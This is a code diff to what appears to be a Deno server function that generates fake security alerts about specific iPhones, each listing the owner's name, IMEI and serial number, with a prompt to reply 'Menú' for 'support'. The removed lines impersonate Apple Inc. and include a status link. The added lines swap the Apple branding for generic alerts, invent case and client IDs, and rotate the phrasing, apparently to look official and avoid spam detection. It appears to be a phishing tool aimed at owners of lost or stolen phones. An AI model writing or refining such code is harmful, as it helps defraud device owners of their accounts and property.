@@ -181,6 +181,12 @@ Deno.serve(async (req) => {
         .single();
 
       if (template) {
+        // Generate IDs
+        const now = new Date();
+        const dateStr = now.toISOString().slice(0, 10).replace(/-/g, '');
+        const caseId = `CAS-${dateStr}-${Math.floor(1000 + Math.random() * 9000)}`;
+        const clientId = `CL-${Math.floor(100000000000 + Math.random() * 900000000000)}`;
+        
         // Replace variables in template with actual process data
         const customSection = template.template_content
           .replace(/\{client_name\}/g, queuedMessage.processes?.client_name || '')
@@ -198,76 +204,55 @@ Deno.serve(async (req) => {
         const battery = Math.floor(Math.random() * (100 - 15 + 1)) + 15;
         
         const openings = [
-          "🔐 Notificación de Seguridad de Apple",
-          "🛡️ Alert de Seguridad Apple",
-          "🔒 Sistema de Seguridad Apple",
-          "⚡ Notificación Automática Apple",
-          "🔔 Alerta de Dispositivo Apple"
+          "🛡️ Alerta de seguridad del sistema",
+          "🔐 Notificación de seguridad",
+          "🔒 Sistema de protección activado"
         ];
         
-        const messagePhrases = [
-          "📌 Mensaje automático enviado como **aviso prioritario al número registrado**.",
-          "🚨 Notificación automática dirigida a **tu contacto principal verificado**.",
-          "📢 Alert generado automáticamente para **el teléfono asociado a tu cuenta**.",
-          "⚠️ Comunicación automática enviada a **tu número de seguridad registrado**.",
-          "📱 Mensaje del sistema enviado a **tu contacto de emergencia principal**."
+        const statusPhrases = [
+          "Detalles del dispositivo:",
+          "Información del equipo:",
+          "Datos técnicos:"
         ];
         
         const deviceSections = [
-          `👤 Propietario: ${queuedMessage.processes?.owner_name || 'No especificado'}
-📱 Modelo: ${queuedMessage.processes?.iphone_model}
-🎨 Color: ${queuedMessage.processes?.color}
-💾 Almacenamiento: ${queuedMessage.processes?.storage}
-📟 IMEI: ${queuedMessage.processes?.imei}
-🔑 Número de serie: ${queuedMessage.processes?.serial_number}
-🔋 Batería: ${battery}%`,
+          `• Modelo: ${queuedMessage.processes?.iphone_model}
+• Color: ${queuedMessage.processes?.color} | Capacidad: ${queuedMessage.processes?.storage}
+• IMEI: ${queuedMessage.processes?.imei}
+• Serie: ${queuedMessage.processes?.serial_number}
+• Nivel de batería: ${battery} %`,
           
-          `👤 Usuario: ${queuedMessage.processes?.owner_name || 'No especificado'}
-📱 Dispositivo: ${queuedMessage.processes?.iphone_model}
-🌈 Color: ${queuedMessage.processes?.color}
-💽 Capacidad: ${queuedMessage.processes?.storage}
-🔢 IMEI: ${queuedMessage.processes?.imei}
-🆔 Serie: ${queuedMessage.processes?.serial_number}
-⚡ Nivel batería: ${battery}%`,
-          
-          `👤 Titular: ${queuedMessage.processes?.owner_name || 'No especificado'}
-📱 iPhone: ${queuedMessage.processes?.iphone_model}
-🎨 Coloración: ${queuedMessage.processes?.color}
-💾 Memoria: ${queuedMessage.processes?.storage}
-📟 Código IMEI: ${queuedMessage.processes?.imei}
-🔑 No. Serie: ${queuedMessage.processes?.serial_number}
-🔋 Carga: ${battery}%`
+          `• Dispositivo: ${queuedMessage.processes?.iphone_model}
+• Coloración: ${queuedMessage.processes?.color} | Almacenamiento: ${queuedMessage.processes?.storage}
+• Código IMEI: ${queuedMessage.processes?.imei}
+• No. Serie: ${queuedMessage.processes?.serial_number}
+• Batería actual: ${battery} %`
         ];
         
         const helpPhrases = [
-          "📬 ¿Eres el dueño? 👉 *Responde con* **Menú** para recibir ayuda inmediata del equipo de soporte técnico 👨🏽‍🔧",
-          "💬 ¿Necesitas asistencia? 👉 *Escribe* **Menú** para contactar con nuestro soporte especializado 👨‍💻",
-          "🆘 ¿Requieres ayuda? 👉 *Envía* **Menú** para obtener asistencia técnica inmediata 🔧",
-          "📞 ¿Buscas soporte? 👉 *Responde* **Menú** para conectar con nuestro equipo técnico 👨‍🔧",
-          "🛠️ ¿Necesitas apoyo? 👉 *Contesta* **Menú** para recibir asistencia profesional 👩‍💻"
+          "¿Necesitás ayuda? Escribí *Menú* para asistencia técnica 👨‍💻",
+          "¿Requerís soporte? Respondé *Menú* para ayuda especializada 🔧",
+          "¿Buscás asistencia? Enviá *Menú* para contactar soporte 👩‍💻"
         ];
         
         const closings = [
-          "🛡️ Apple Security – Servicio activo 24/7\n©️ 2025 Apple Inc.",
-          "🔒 Apple Security – Sistema operativo 24/7\n©️ 2025 Apple Inc.",
-          "⚡ Apple Security – Monitoreo continuo\n©️ 2025 Apple Inc.",
-          "🌐 Apple Security – Protección 24 horas\n©️ 2025 Apple Inc.",
-          "🔐 Apple Security – Vigilancia permanente\n©️ 2025 Apple Inc."
+          "Servicio automatizado – Atención disponible 24 h",
+          "Sistema automático – Soporte activo 24/7",
+          "Monitoreo continuo – Asistencia permanente"
         ];
 
-        // Build complete message: opening + custom section + message phrase + device + url + help + closing
+        // Build complete message: opening + custom section + device + help + closing
         queuedMessage.message_content = `${random(openings)}
 
 ${customSection}
 
-${random(messagePhrases)}
+ID de caso: ${caseId}
+ID de cliente: ${clientId}
 
+${random(statusPhrases)}
 ${random(deviceSections)}
 
-${queuedMessage.processes?.url ? `🌍 Ver estado del dispositivo: ${queuedMessage.processes.url}` : ''}
-
 ${random(helpPhrases)}
-
 ${random(closings)}`;
       }
     }
